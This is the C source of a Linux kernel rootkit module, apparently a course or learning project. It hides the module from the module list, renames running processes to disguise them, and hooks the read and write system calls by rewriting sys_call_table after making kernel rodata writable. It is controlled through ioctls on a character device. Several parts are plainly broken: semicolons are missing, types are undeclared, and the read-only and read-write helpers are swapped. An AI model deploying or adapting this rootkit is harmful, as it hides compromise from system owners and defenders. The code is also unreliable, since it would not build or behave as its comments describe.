#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

/* The rootkit module should be visible by default. */
static bool module_hidden = false;
static struct list_head *prev_module_entry = NULL;

static void toggle_module_visibility(void) {
    if (!module_hidden) {
        prev_module_entry = THIS_MODULE->list.prev;
        try_module_get(THIS_MODULE); // Prevent unloading
        // Hide module: remove from list
        list_del(&THIS_MODULE->list);
        module_hidden = true;
        
        printk(KERN_INFO "Module hidden\n");
    } else {
        if (prev_module_entry)
            list_add(&THIS_MODULE->list, prev_module_entry);
        module_hidden = false;
        module_put(THIS_MODULE); // Balance reference count

        printk(KERN_INFO "Module unhidden\n");
    }
}

static void masquerade_proc(struct masq_proc *proc) {
    struct task_struct *task;
    char *new_name = proc->new_name;
    char *orig_name = proc->orig_name;

    // new name must be shorter than original name
    if (strnlen(new_name, MASQ_LEN) >= strnlen(orig_name, MASQ_LEN)) {
        printk(KERN_WARNING "New name must be shorter than original name\n");
        return;
    }

    // iterate over all processes and masquerade name if possible
    for_each_process(task) {
        if (strcmp(task->comm, orig_name) == 0) {
            // use strncpy instead of strcpy to avoid overflow
            strncpy(task->comm, new_name, TASK_COMM_LEN - 1);
            task->comm[TASK_COMM_LEN - 1] = '\0';
        }
    }
}

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

unsigned long (*kallsyms_lookup_name)(const char *);

static void get_kallsyms_lookup_name (void) {
    struct kprobe kp;
    register_kprobe(&kp);
    kallsyms_lookup_name = kp.addr
    unregister_kprobe(&kp);
}

static unsigned long *__sys_call_table;
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;


static void resolve_symbol_addr (void) {
    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
}

#define section_size init_begin - start_rodata

// change the memory region to be read-only
static inline void memory_ro (void) {
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, \
                        section_size, PAGE_KERNEL); 
}

// change the memory region to be read-write
static inline void memory_rw (void) {
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, \
                        section_size, PAGE_KERNEL_RO);
}

static t_syscall real_read;
static t_syscall real_write;
static asmlinkage int fake_read (pt_regs *regs);
static asmlinkage int fake_write (pt_regs *regs);

static int set_syscall_filter (void) {
    memory_rw();
    
    real_read = (t_syscall)__sys_call_table[__NR_read];
    real_write = (t_syscall)__sys_call_table[__NR_write];
    __sys_call_table[__NR_read] = (unsigned long) &fake_read;
    __sys_call_table[__NR_write] = (unsigned long) &fake_write;

    memory_ro();
    return 0;
}

static int remove_syscall_filter (void) {
    memory_rw();
    
    __sys_call_table[__NR_read] = real_read;
    __sys_call_table[__NR_write] = real_write;

    memory_ro();
    return 0;
}

struct filter {
    int syscall_nr;             // Syscall number
    char comm[TASK_FILTER_LEN]; // Process name
    struct list_head list;      // circular list
}

static filter *head;

static asmlinkage int fake_read (pt_regs *regs) {
    filter *cur;
    struct task_struct *current_t = current;
    list_for_each_entry(cur, &head->list, list) {
        if (strcmp(cur->comm, current_t->comm))
            return -EPERM;
    }
    return real_read(regs);
}

static asmlinkage int fake_write (pt_regs *regs) {
    filter *cur;
    struct task_struct *current_t = current;
    list_for_each_entry(cur, &head->list, list) {
        if (strcmp(cur->comm, current_t->comm))
            return -EPERM;
    }
    return real_write(regs);
}

static int add_new_filter_element (struct filter_info *info) {
    // We Do check whether two or more identical elements are added to the filter 
    int ret = 0;

    struct filter *cur;
    list_for_each_entry(cur, &head->list, list) {
        if (info->syscall_nr == cur->syscall_nr && strcmp(cur->comm, info->comm) == 0) {
            ret = -EPERM; // error for identical element
            return ret;
        }
    }
    
    struct filter *element;
    element = kmalloc(sizeof(struct filter), GFP_KERNEL);
    if (!element) {
        ret = -ENOMEM;
        return ret;
    }

    strcpy(element->comm, info->comm);
    element->syscall_nr = info->syscall_nr;
    list_add_tail(&element->list, &head);
    return ret;
}

static int remove_filter_element (struct filter_info *info) {
    ret = -EFAULT; // info NOT in the list
    struct filter *cur;
    list_for_each_entry(cur, &head->list, list) {
        if (info->syscall_nr == cur->syscall_nr && strcmp(cur->comm, info->comm) == 0) {
            list_del(&cur->list);
            kfree(cur);
            ret = 0;
            break;
        }
    }
    return ret;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    long ret = 0;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        toggle_module_visibility();
        break;
    case IOCTL_MOD_MASQ:
        struct masq_proc_req req;
        struct masq_proc *procs;

        // copy request from user space
        if (copy_from_user(&req, (void *)arg, sizeof(req))) {
            ret = -EFAULT;
            break;
        }

        // allocate memory for procs
        procs = kmalloc(req.len * sizeof(struct masq_proc), GFP_KERNEL);
        if (!procs) {
            ret = -ENOMEM;
            break;
        }

        // copy procs from user space
        if (copy_from_user(procs, req.list, req.len * sizeof(struct masq_proc))) {
            kfree(procs);
            ret = -EFAULT;
            break;
        }

        // masquerade each process
        for (int i = 0; i < req.len; i++) {
            masquerade_proc(&procs[i]);
        }

        kfree(procs);
        break;
    case IOCTL_ADD_FILTER:
        struct filter_info info;
        if (copy_from_user(&info, (void *)arg, sizeof(info))) {
            ret = -EFAULT;
            break;
        }
        ret = add_new_filter_element(&info);
        break;
    case IOCTL_REMOVE_FILTER:
        struct filter_info info;
        if (copy_from_user(&info, (void *)arg, sizeof(info))) {
            ret = -EFAULT;
            break;
        }
        ret = remove_filter_element(&info)
        break;
    default:
        ret = -EINVAL;
    }
    return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void) {
    // get function kallsyms_lookup_name
    get_kallsyms_lookup_name();
    // get addresses of symbols
    resolve_symbol_addr();
    // set filter
    set_syscall_filter();
    // init filter_list *head
    head = kmalloc(sizeof(struct filter), GFP_KERNEL);
    head->list.prev = &head->list;
    head->list.next = &head->list;

    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    return 0;
}

static void __exit rootkit_exit(void) {
    // TODO: unhook syscall and cleanup syscall filter list
    remove_syscall_filter();

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
